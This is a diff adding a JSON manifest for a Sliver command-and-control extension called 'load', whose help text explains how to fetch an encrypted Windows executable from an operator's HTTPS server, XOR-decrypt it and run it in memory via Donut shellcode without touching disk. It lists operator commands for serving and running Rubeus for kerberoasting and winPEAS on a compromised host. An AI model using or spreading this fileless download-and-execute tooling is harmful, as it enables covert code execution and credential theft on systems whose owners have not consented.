@@ -1,0 +1,26 @@
+{
+    "name": "load",
+    "version": "0.1.0",
+    "extension_author": "loadkit",
+    "original_author": "loadkit",
+    "repo_url": "",
+    "help": "Execute a PE binary entirely in-memory via Donut shellcode. Fetches an encrypted payload from the operator's HTTPS server, XOR-decrypts it, and runs it without touching disk. Captures stdout/stderr and returns output to the Sliver console.\n\nUsage: load url=<https://...> key=<64 hex chars>\n\n  url — HTTPS URL serving the encrypted payload (payload.enc from 'loadkit load')\n  key — 32-byte XOR key, hex-encoded (printed by 'loadkit load')\n\nFirst run:\n  1. Operator: loadkit load --binary rubeus.exe --args \"kerberoast /nowrap\" --url https://192.168.1.10:8443/abc --serve\n  2. Sliver:   extensions install build/load-0.1.0.tar.gz\n  3. Sliver:   load url=https://192.168.1.10:8443/abc key=<key from step 1>\n\nSubsequent runs (same session, different binary):\n  1. Operator: loadkit load --binary winpeas.exe --url https://192.168.1.10:8443/xyz --serve\n  2. Sliver:   load url=https://192.168.1.10:8443/xyz key=<new key>",
+    "commands": [
+        {
+            "name": "load",
+            "entrypoint": "GoExtensionArgs",
+            "help": "Execute a PE binary in-memory via Donut shellcode (fetches encrypted payload from HTTPS URL)",
+            "allow_args": true,
+            "default_args": "",
+            "is_reflective": false,
+            "is_assembly": false,
+            "files": [
+                {
+                    "os": "windows",
+                    "arch": "amd64",
+                    "path": "load.x64.dll"
+                }
+            ]
+        }
+    ]
+}
